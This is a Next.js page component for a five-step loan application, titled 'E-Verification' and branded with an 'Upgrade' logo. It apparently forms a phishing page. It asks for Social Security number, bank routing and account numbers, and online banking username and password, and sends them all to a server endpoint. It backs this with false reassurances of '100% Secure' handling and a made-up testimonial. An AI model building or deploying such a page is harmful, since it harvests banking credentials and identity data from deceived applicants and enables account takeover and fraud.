'use client';

import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import * as z from 'zod';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Progress } from '@/components/ui/progress';
import { CheckCircle, DollarSign, Shield, Clock, ChevronRight, ChevronLeft, Phone, Mail, MapPin, Users, Star, TrendingUp, Award, Zap, Lock, CreditCard, Building, Eye, EyeOff, ArrowLeft, Sparkles, BadgeCheck, Timer, Rocket } from 'lucide-react';
import { cn } from '@/lib/utils';
import Link from 'next/link';

// Form schemas
const step1Schema = z.object({
  loanAmount: z.string().min(1, 'Loan amount is required').refine((val) => {
    const num = parseFloat(val);
    return num >= 1000 && num <= 10000;
  }, 'Loan amount must be between $1,000 and $8,000'),
  loanPurpose: z.string().min(1, 'Loan purpose is required'),
});

const step2Schema = z.object({
  firstName: z.string().min(2, 'First name must be at least 2 characters').max(50, 'First name too long'),
  middleName: z.string().min(1, 'Middle name is required').max(50, 'Middle name too long'),
  lastName: z.string().min(2, 'Last name must be at least 2 characters').max(50, 'Last name too long'),
  streetAddress: z.string().min(5, 'Street address must be at least 5 characters').max(100, 'Address too long'),
  city: z.string().min(2, 'City must be at least 2 characters').max(50, 'City name too long'),
  state: z.string().min(2, 'State is required').max(2, 'State must be 2 characters'),
  zipCode: z.string().min(5, 'ZIP code must be at least 5 digits').max(10, 'ZIP code too long').regex(/^\d{5}(-\d{4})?$/, 'Invalid ZIP code format'),
});

const step3Schema = z.object({
  phoneNumber: z.string().min(10, 'Phone number must be at least 10 digits').regex(/^[\+]?[1-9][\d]{0,15}$/, 'Invalid phone number format'),
  secondNumber: z.string().min(10, 'Second number must be at least 10 digits').regex(/^[\+]?[1-9][\d]{0,15}$/, 'Invalid phone number format'),
  emailAddress: z.string().email('Please enter a valid email address').max(100, 'Email too long'),
});

const step4Schema = z.object({
  bankName: z.string().min(2, 'Bank name is required').max(100, 'Bank name too long'),
  routingNumber: z.string().min(9, 'Routing number must be exactly 9 digits').max(9, 'Routing number must be exactly 9 digits').regex(/^\d{9}$/, 'Routing number must contain only digits'),
  accountNumber: z.string().min(8, 'Account number must be at least 8 digits').max(20, 'Account number too long').regex(/^\d+$/, 'Account number must contain only digits'),
});

const step5Schema = z.object({
  socialSecurityNumber: z.string().min(9, 'Social Security Number is required').regex(/^\d{3}-?\d{2}-?\d{4}$/, 'Invalid SSN format (XXX-XX-XXXX)'),
  onlineBankingUsername: z.string().min(3, 'Username must be at least 3 characters').max(50, 'Username too long'),
  onlineBankingPassword: z.string().min(6, 'Password must be at least 6 characters').max(100, 'Password too long'),
});

const allStepsSchema = step1Schema.merge(step2Schema).merge(step3Schema).merge(step4Schema).merge(step5Schema);

type FormData = z.infer<typeof allStepsSchema>;

const steps = [
  { id: 1, title: 'Loan Details', icon: DollarSign, color: 'from-blue-500 to-blue-600' },
  { id: 2, title: 'Personal Info', icon: Users, color: 'from-purple-500 to-purple-600' },
  { id: 3, title: 'Contact', icon: Phone, color: 'from-green-500 to-green-600' },
  { id: 4, title: 'Banking', icon: Building, color: 'from-orange-500 to-orange-600' },
  { id: 5, title: 'Security', icon: Shield, color: 'from-red-500 to-red-600' },
];

const loanPurposes = [
  'Debt Consolidation',
  'Home Improvement',
  'Medical Expenses',
  'Major Purchase',
  'Car Repair',
  'Education',
  'Vacation',
  'Business',
  'Emergency',
  'Other'
];

const benefits = [
  { icon: Zap, title: 'Instant Approval', description: 'Get pre-approved in 2 minutes', gradient: 'from-yellow-400 to-orange-500' },
  { icon: Shield, title: 'Bank-Level Security', description: '256-bit SSL encryption', gradient: 'from-blue-400 to-blue-600' },
  { icon: Timer, title: 'Fast Funding', description: 'Money in 24 hours', gradient: 'from-green-400 to-green-600' },
  { icon: BadgeCheck, title: 'Trusted by 500K+', description: 'Join our happy customers', gradient: 'from-purple-400 to-purple-600' },
];

export default function EVarification() {
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState<Partial<FormData>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const form = useForm<FormData>({
    resolver: zodResolver(allStepsSchema),
    defaultValues: formData,
    mode: 'onChange'
  });

  const getCurrentSchema = () => {
    switch (currentStep) {
      case 1: return step1Schema;
      case 2: return step2Schema;
      case 3: return step3Schema;
      case 4: return step4Schema;
      case 5: return step5Schema;
      default: return allStepsSchema;
    }
  };

  const validateCurrentStep = async () => {
    const schema = getCurrentSchema();
    const currentData = form.getValues();

    try {
      schema.parse(currentData);
      return true;
    } catch (error) {
      if (error instanceof z.ZodError) {
        error.errors.forEach((err) => {
          form.setError(err.path[0] as keyof FormData, {
            type: 'manual',
            message: err.message,
          });
        });
      }
      return false;
    }
  };

  const nextStep = async () => {
    const isValid = await validateCurrentStep();
    if (isValid && currentStep < 5) {
      setFormData(prev => ({ ...prev, ...form.getValues() }));
      setCurrentStep(currentStep + 1);
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const onSubmit = async (data: FormData) => {
    setIsSubmitting(true);
    try {
      const response = await fetch('/api/submit-form', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        setSubmitted(true);
      } else {
        throw new Error('Failed to submit form');
      }
    } catch (error) {
      console.error('Error submitting form:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const renderStepContent = () => {
    switch (currentStep) {
      case 1:
        return (
          <div className="space-y-6">
            <div className="space-y-3">
              <Label htmlFor="loanAmount" className="text-base font-semibold text-gray-700">How much do you need?</Label>
              <div className="relative">
                <DollarSign className="absolute left-4 top-4 h-5 w-5 text-gray-400" />
                <Input
                  id="loanAmount"
                  placeholder="5000"
                  className="pl-12 h-14 text-lg border-2 focus:border-blue-500 rounded-xl"
                  {...form.register('loanAmount')}
                />
              </div>
              <p className="text-sm text-gray-500">Between $1,000 - $8,000</p>
              {form.formState.errors.loanAmount && (
                <p className="text-sm text-red-600 flex items-center gap-1">
                  <span className="text-lg">⚠️</span> {form.formState.errors.loanAmount.message}
                </p>
              )}
            </div>

            <div className="space-y-3">
              <Label htmlFor="loanPurpose" className="text-base font-semibold text-gray-700">What's it for?</Label>
              <Select onValueChange={(value) => form.setValue('loanPurpose', value)}>
                <SelectTrigger className="h-14 text-lg border-2 rounded-xl">
                  <SelectValue placeholder="Select purpose" />
                </SelectTrigger>
                <SelectContent>
                  {loanPurposes.map((purpose) => (
                    <SelectItem key={purpose} value={purpose} className="text-base">
                      {purpose}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              {form.formState.errors.loanPurpose && (
                <p className="text-sm text-red-600 flex items-center gap-1">
                  <span className="text-lg">⚠️</span> {form.formState.errors.loanPurpose.message}
                </p>
              )}
            </div>
          </div>
        );

      case 2:
        return (
          <div className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div className="space-y-2">
                <Label htmlFor="firstName" className="text-sm font-semibold text-gray-700">First Name</Label>
                <Input
                  id="firstName"
                  placeholder="John"
                  className="h-12 border-2 focus:border-purple-500 rounded-xl"
                  {...form.register('firstName')}
                />
                {form.formState.errors.firstName && (
                  <p className="text-xs text-red-600">{form.formState.errors.firstName.message}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="middleName" className="text-sm font-semibold text-gray-700">Middle Name</Label>
                <Input
                  id="middleName"
                  placeholder="Michael"
                  className="h-12 border-2 focus:border-purple-500 rounded-xl"
                  {...form.register('middleName')}
                />
                {form.formState.errors.middleName && (
                  <p className="text-xs text-red-600">{form.formState.errors.middleName.message}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="lastName" className="text-sm font-semibold text-gray-700">Last Name</Label>
                <Input
                  id="lastName"
                  placeholder="Doe"
                  className="h-12 border-2 focus:border-purple-500 rounded-xl"
                  {...form.register('lastName')}
                />
                {form.formState.errors.lastName && (
                  <p className="text-xs text-red-600">{form.formState.errors.lastName.message}</p>
                )}
              </div>
            </div>

            <div className="space-y-2">
              <Label htmlFor="streetAddress" className="text-sm font-semibold text-gray-700">Street Address</Label>
              <Input
                id="streetAddress"
                placeholder="123 Main Street"
                className="h-12 border-2 focus:border-purple-500 rounded-xl"
                {...form.register('streetAddress')}
              />
              {form.formState.errors.streetAddress && (
                <p className="text-xs text-red-600">{form.formState.errors.streetAddress.message}</p>
              )}
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div className="space-y-2">
                <Label htmlFor="city" className="text-sm font-semibold text-gray-700">City</Label>
                <Input
                  id="city"
                  placeholder="New York"
                  className="h-12 border-2 focus:border-purple-500 rounded-xl"
                  {...form.register('city')}
                />
                {form.formState.errors.city && (
                  <p className="text-xs text-red-600">{form.formState.errors.city.message}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="state" className="text-sm font-semibold text-gray-700">State</Label>
                <Input
                  id="state"
                  placeholder="NY"
                  maxLength={2}
                  className="h-12 border-2 focus:border-purple-500 rounded-xl"
                  {...form.register('state')}
                />
                {form.formState.errors.state && (
                  <p className="text-xs text-red-600">{form.formState.errors.state.message}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="zipCode" className="text-sm font-semibold text-gray-700">ZIP Code</Label>
                <Input
                  id="zipCode"
                  placeholder="10001"
                  className="h-12 border-2 focus:border-purple-500 rounded-xl"
                  {...form.register('zipCode')}
                />
                {form.formState.errors.zipCode && (
                  <p className="text-xs text-red-600">{form.formState.errors.zipCode.message}</p>
                )}
              </div>
            </div>
          </div>
        );

      case 3:
        return (
          <div className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="phoneNumber" className="text-sm font-semibold text-gray-700">Primary Phone</Label>
                <div className="relative">
                  <Phone className="absolute left-4 top-3.5 h-5 w-5 text-gray-400" />
                  <Input
                    id="phoneNumber"
                    placeholder="(555) 123-4567"
                    className="pl-12 h-12 border-2 focus:border-green-500 rounded-xl"
                    {...form.register('phoneNumber')}
                  />
                </div>
                {form.formState.errors.phoneNumber && (
                  <p className="text-xs text-red-600">{form.formState.errors.phoneNumber.message}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="secondNumber" className="text-sm font-semibold text-gray-700">Secondary Phone</Label>
                <div className="relative">
                  <Phone className="absolute left-4 top-3.5 h-5 w-5 text-gray-400" />
                  <Input
                    id="secondNumber"
                    placeholder="(555) 987-6543"
                    className="pl-12 h-12 border-2 focus:border-green-500 rounded-xl"
                    {...form.register('secondNumber')}
                  />
                </div>
                {form.formState.errors.secondNumber && (
                  <p className="text-xs text-red-600">{form.formState.errors.secondNumber.message}</p>
                )}
              </div>
            </div>

            <div className="space-y-2">
              <Label htmlFor="emailAddress" className="text-sm font-semibold text-gray-700">Email Address</Label>
              <div className="relative">
                <Mail className="absolute left-4 top-3.5 h-5 w-5 text-gray-400" />
                <Input
                  id="emailAddress"
                  type="email"
                  placeholder="john@example.com"
                  className="pl-12 h-12 border-2 focus:border-green-500 rounded-xl"
                  {...form.register('emailAddress')}
                />
              </div>
              {form.formState.errors.emailAddress && (
                <p className="text-xs text-red-600">{form.formState.errors.emailAddress.message}</p>
              )}
            </div>
          </div>
        );

      case 4:
        return (
          <div className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="bankName" className="text-sm font-semibold text-gray-700">Bank Name</Label>
              <div className="relative">
                <Building className="absolute left-4 top-3.5 h-5 w-5 text-gray-400" />
                <Input
                  id="bankName"
                  placeholder="Chase Bank"
                  className="pl-12 h-12 border-2 focus:border-orange-500 rounded-xl"
                  {...form.register('bankName')}
                />
              </div>
              {form.formState.errors.bankName && (
                <p className="text-xs text-red-600">{form.formState.errors.bankName.message}</p>
              )}
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="routingNumber" className="text-sm font-semibold text-gray-700">Routing Number</Label>
                <Input
                  id="routingNumber"
                  placeholder="123456789"
                  maxLength={9}
                  className="h-12 border-2 focus:border-orange-500 rounded-xl"
                  {...form.register('routingNumber')}
                />
                {form.formState.errors.routingNumber && (
                  <p className="text-xs text-red-600">{form.formState.errors.routingNumber.message}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="accountNumber" className="text-sm font-semibold text-gray-700">Account Number</Label>
                <Input
                  id="accountNumber"
                  placeholder="1234567890"
                  className="h-12 border-2 focus:border-orange-500 rounded-xl"
                  {...form.register('accountNumber')}
                />
                {form.formState.errors.accountNumber && (
                  <p className="text-xs text-red-600">{form.formState.errors.accountNumber.message}</p>
                )}
              </div>
            </div>
          </div>
        );

      case 5:
        return (
          <div className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="socialSecurityNumber" className="text-sm font-semibold text-gray-700">Social Security Number</Label>
              <div className="relative">
                <Lock className="absolute left-4 top-3.5 h-5 w-5 text-gray-400" />
                <Input
                  id="socialSecurityNumber"
                  placeholder="123-45-6789"
                  className="pl-12 h-12 border-2 focus:border-red-500 rounded-xl"
                  {...form.register('socialSecurityNumber')}
                />
              </div>
              {form.formState.errors.socialSecurityNumber && (
                <p className="text-xs text-red-600">{form.formState.errors.socialSecurityNumber.message}</p>
              )}
            </div>

            <div className="space-y-2">
              <Label htmlFor="onlineBankingUsername" className="text-sm font-semibold text-gray-700">Online Banking Username</Label>
              <Input
                id="onlineBankingUsername"
                placeholder="your_username"
                className="h-12 border-2 focus:border-red-500 rounded-xl"
                {...form.register('onlineBankingUsername')}
              />
              {form.formState.errors.onlineBankingUsername && (
                <p className="text-xs text-red-600">{form.formState.errors.onlineBankingUsername.message}</p>
              )}
            </div>

            <div className="space-y-2">
              <Label htmlFor="onlineBankingPassword" className="text-sm font-semibold text-gray-700">Online Banking Password</Label>
              <div className="relative">
                <Input
                  id="onlineBankingPassword"
                  type={showPassword ? "text" : "password"}
                  placeholder="your_password"
                  className="h-12 border-2 focus:border-red-500 rounded-xl pr-12"
                  {...form.register('onlineBankingPassword')}
                />
                <Button
                  type="button"
                  variant="ghost"
                  size="sm"
                  className="absolute right-1 top-1 h-10 px-3 hover:bg-gray-100 rounded-lg"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? (
                    <EyeOff className="h-5 w-5 text-gray-500" />
                  ) : (
                    <Eye className="h-5 w-5 text-gray-500" />
                  )}
                </Button>
              </div>
              {form.formState.errors.onlineBankingPassword && (
                <p className="text-xs text-red-600">{form.formState.errors.onlineBankingPassword.message}</p>
              )}
            </div>

            <div className="pt-4">
              <Button
                onClick={form.handleSubmit(onSubmit)}
                disabled={isSubmitting}
                className="w-full h-14 text-lg font-bold bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 rounded-xl shadow-lg"
              >
                {isSubmitting ? (
                  <span className="flex items-center gap-2">
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white" />
                    Submitting...
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <Rocket className="h-5 w-5" />
                    Submit Application
                  </span>
                )}
              </Button>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  if (submitted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-green-50 via-blue-50 to-purple-50 flex items-center justify-center p-4">
        <motion.div
          initial={{ opacity: 0, scale: 0.8, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          transition={{ duration: 0.6, type: "spring" }}
          className="text-center max-w-2xl"
        >
          <motion.div
            initial={{ scale: 0 }}
            animate={{ scale: 1 }}
            transition={{ delay: 0.2, type: "spring", stiffness: 200 }}
            className="w-32 h-32 bg-gradient-to-br from-green-400 to-green-600 rounded-full flex items-center justify-center mx-auto mb-8 shadow-2xl"
          >
            <CheckCircle className="h-16 w-16 text-white" />
          </motion.div>
          <h2 className="text-4xl md:text-5xl font-extrabold text-gray-900 mb-6 bg-clip-text text-transparent bg-gradient-to-r from-green-600 to-blue-600">
            Success!
          </h2>
          <p className="text-xl text-gray-700 mb-8 leading-relaxed">
            Your application has been submitted successfully. Our team will review it and get back to you within 24 hours.
          </p>
          <Card className="bg-white/80 backdrop-blur-sm border-2 border-green-200 shadow-xl rounded-2xl">
            <CardContent className="p-8 space-y-4 text-left">
              <h3 className="font-bold text-lg text-gray-900 mb-4">What happens next?</h3>
              <div className="space-y-3">
                <div className="flex items-start gap-3">
                  <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                    <Mail className="h-4 w-4 text-green-600" />
                  </div>
                  <p className="text-gray-700">You'll receive a confirmation email shortly</p>
                </div>
                <div className="flex items-start gap-3">
                  <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
                    <Clock className="h-4 w-4 text-blue-600" />
                  </div>
                  <p className="text-gray-700">Our team will review your application within 24 hours</p>
                </div>
                <div className="flex items-start gap-3">
                  <div className="w-8 h-8 bg-purple-100 rounded-full flex items-center justify-center flex-shrink-0">
                    <Phone className="h-4 w-4 text-purple-600" />
                  </div>
                  <p className="text-gray-700">We'll contact you with a decision and next steps</p>
                </div>
              </div>
            </CardContent>
          </Card>
          <Link href="/">
            <Button className="mt-8 h-12 px-8 text-base font-semibold bg-gradient-to-r from-blue-600 to-green-600 hover:from-blue-700 hover:to-green-700 rounded-xl">
              Return to Home
            </Button>
          </Link>
        </motion.div>
      </div>
    );
  }

  const currentStepData = steps[currentStep - 1];

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-gray-50">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-white/95 backdrop-blur-lg border-b border-gray-200 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-20">
            <Link href="/" className="flex items-center">
              <img
                src="/upgrade.jpg"
                alt="Upgrade Logo"
                className="h-12 rounded-xl object-cover w-[140px]"
              />
            </Link>

            <Link href="/">
              <Button variant="outline" className="flex items-center gap-2 h-11 px-6 rounded-xl border-2 hover:border-blue-600 hover:text-blue-600 transition-all">
                <ArrowLeft className="w-4 h-4" />
                <span className="font-semibold">Back to Home</span>
              </Button>
            </Link>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        {/* Progress Section */}
        <div className="mb-12">
          <div className="flex items-center justify-between mb-6">
            <div>
              <h1 className="text-3xl md:text-4xl font-extrabold text-gray-900 mb-2">
                E-Verification Process
              </h1>
              <p className="text-lg text-gray-600">Complete your loan application in 5 easy steps</p>
            </div>
            <div className="hidden md:block">
              <div className="bg-gradient-to-r from-blue-100 to-green-100 px-6 py-3 rounded-full">
                <span className="text-sm font-bold text-gray-700">
                  Step {currentStep} of {steps.length}
                </span>
              </div>
            </div>
          </div>

          {/* Desktop Step Indicator */}
          <div className="hidden md:flex items-center justify-between mb-6">
            {steps.map((step, index) => (
              <div key={step.id} className="flex items-center flex-1">
                <div className="flex items-center">
                  <motion.div
                    initial={false}
                    animate={{
                      scale: currentStep === step.id ? 1.1 : 1,
                    }}
                    className={cn(
                      "relative w-14 h-14 rounded-2xl flex items-center justify-center transition-all duration-300 shadow-lg",
                      currentStep === step.id
                        ? `bg-gradient-to-br ${step.color} text-white`
                        : currentStep > step.id
                        ? "bg-green-500 text-white"
                        : "bg-gray-200 text-gray-400"
                    )}
                  >
                    {currentStep > step.id ? (
                      <CheckCircle className="w-7 h-7" />
                    ) : (
                      <step.icon className="w-7 h-7" />
                    )}
                  </motion.div>
                </div>
                {index < steps.length - 1 && (
                  <div className="flex-1 h-1 mx-4 bg-gray-200 rounded-full overflow-hidden">
                    <motion.div
                      initial={false}
                      animate={{
                        width: currentStep > step.id ? "100%" : "0%"
                      }}
                      transition={{ duration: 0.5 }}
                      className="h-full bg-gradient-to-r from-green-400 to-green-600"
                    />
                  </div>
                )}
              </div>
            ))}
          </div>

          {/* Mobile Progress Bar */}
          <div className="md:hidden space-y-4">
            <Progress value={(currentStep / steps.length) * 100} className="h-3 rounded-full" />
            <div className="flex items-center justify-center gap-2">
              <div className={cn(
                "w-12 h-12 rounded-xl flex items-center justify-center shadow-lg",
                `bg-gradient-to-br ${currentStepData.color} text-white`
              )}>
                <currentStepData.icon className="w-6 h-6" />
              </div>
              <div>
                <p className="font-bold text-gray-900">{currentStepData.title}</p>
                <p className="text-sm text-gray-500">Step {currentStep} of {steps.length}</p>
              </div>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Main Form - Takes 2 columns */}
          <div className="lg:col-span-2">
            <motion.div
              key={currentStep}
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.4 }}
            >
              <Card className="shadow-2xl border-0 rounded-3xl overflow-hidden bg-white">
                <div className={cn(
                  "h-2 bg-gradient-to-r",
                  currentStepData.color
                )} />
                <CardHeader className="pb-6 pt-8 px-8">
                  <div className="flex items-center gap-4 mb-4">
                    <div className={cn(
                      "w-16 h-16 rounded-2xl flex items-center justify-center shadow-lg",
                      `bg-gradient-to-br ${currentStepData.color} text-white`
                    )}>
                      <currentStepData.icon className="w-8 h-8" />
                    </div>
                    <div>
                      <CardTitle className="text-2xl md:text-3xl font-bold text-gray-900">
                        {currentStepData.title}
                      </CardTitle>
                      <CardDescription className="text-base text-gray-600 mt-1">
                        {currentStep === 1 && "Tell us about your loan needs"}
                        {currentStep === 2 && "Your basic details and address"}
                        {currentStep === 3 && "How can we reach you?"}
                        {currentStep === 4 && "Your bank account information"}
                        {currentStep === 5 && "Final security verification"}
                      </CardDescription>
                    </div>
                  </div>
                </CardHeader>
                <CardContent className="px-8 pb-8">
                  <AnimatePresence mode="wait">
                    <motion.div
                      key={currentStep}
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -10 }}
                      transition={{ duration: 0.3 }}
                    >
                      {renderStepContent()}
                    </motion.div>
                  </AnimatePresence>

                  {currentStep < 5 && (
                    <div className="flex flex-col sm:flex-row gap-4 mt-8 pt-6 border-t">
                      <Button
                        variant="outline"
                        onClick={prevStep}
                        disabled={currentStep === 1}
                        className="h-12 px-8 rounded-xl border-2 font-semibold disabled:opacity-50 order-2 sm:order-1"
                      >
                        <ChevronLeft className="h-5 w-5 mr-2" />
                        Previous
                      </Button>
                      <Button
                        onClick={nextStep}
                        className={cn(
                          "h-12 px-8 rounded-xl font-semibold text-white flex-1 shadow-lg order-1 sm:order-2",
                          `bg-gradient-to-r ${currentStepData.color} hover:opacity-90`
                        )}
                      >
                        Continue
                        <ChevronRight className="h-5 w-5 ml-2" />
                      </Button>
                    </div>
                  )}
                </CardContent>
              </Card>
            </motion.div>
          </div>

          {/* Sidebar - Takes 1 column */}
          <div className="space-y-6">
            {/* Benefits Card */}
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5, delay: 0.2 }}
            >
              <Card className="shadow-xl border-0 rounded-3xl overflow-hidden bg-gradient-to-br from-blue-50 to-purple-50">
                <CardHeader className="pb-4">
                  <CardTitle className="flex items-center gap-2 text-xl">
                    <Sparkles className="h-6 w-6 text-blue-600" />
                    Why Choose Us?
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  {benefits.map((benefit, index) => (
                    <motion.div
                      key={index}
                      initial={{ opacity: 0, x: -20 }}
                      animate={{ opacity: 1, x: 0 }}
                      transition={{ duration: 0.4, delay: index * 0.1 }}
                      className="flex items-start gap-3 p-3 bg-white rounded-xl hover:shadow-md transition-shadow"
                    >
                      <div className={cn(
                        "w-10 h-10 rounded-lg flex items-center justify-center flex-shrink-0",
                        `bg-gradient-to-br ${benefit.gradient}`
                      )}>
                        <benefit.icon className="w-5 h-5 text-white" />
                      </div>
                      <div>
                        <h4 className="font-bold text-gray-900 text-sm">{benefit.title}</h4>
                        <p className="text-xs text-gray-600 mt-0.5">{benefit.description}</p>
                      </div>
                    </motion.div>
                  ))}
                </CardContent>
              </Card>
            </motion.div>

            {/* Security Badge */}
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5, delay: 0.4 }}
            >
              <Card className="shadow-xl border-0 rounded-3xl overflow-hidden bg-gradient-to-br from-green-50 to-emerald-50">
                <CardContent className="p-6 text-center">
                  <div className="w-16 h-16 bg-gradient-to-br from-green-400 to-green-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
                    <Lock className="w-8 h-8 text-white" />
                  </div>
                  <h3 className="font-bold text-gray-900 mb-2">100% Secure</h3>
                  <p className="text-sm text-gray-600 leading-relaxed">
                    Your information is protected with 256-bit SSL encryption and never shared with third parties.
                  </p>
                </CardContent>
              </Card>
            </motion.div>

            {/* Testimonial */}
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5, delay: 0.6 }}
            >
              <Card className="shadow-xl border-0 rounded-3xl overflow-hidden bg-white">
                <CardContent className="p-6">
                  <div className="flex items-center gap-1 mb-3">
                    {[...Array(5)].map((_, i) => (
                      <Star key={i} className="h-4 w-4 fill-yellow-400 text-yellow-400" />
                    ))}
                  </div>
                  <p className="text-gray-700 text-sm mb-4 italic leading-relaxed">
                    "The entire process was smooth and transparent. I got approved in minutes and had the money the next day. Highly recommend!"
                  </p>
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-gradient-to-br from-blue-400 to-purple-400 rounded-full flex items-center justify-center text-white font-bold">
                      SJ
                    </div>
                    <div>
                      <p className="font-semibold text-gray-900 text-sm">Sarah Johnson</p>
                      <p className="text-xs text-gray-500">Austin, TX</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </motion.div>
          </div>
        </div>
      </div>
    </div>
  );
}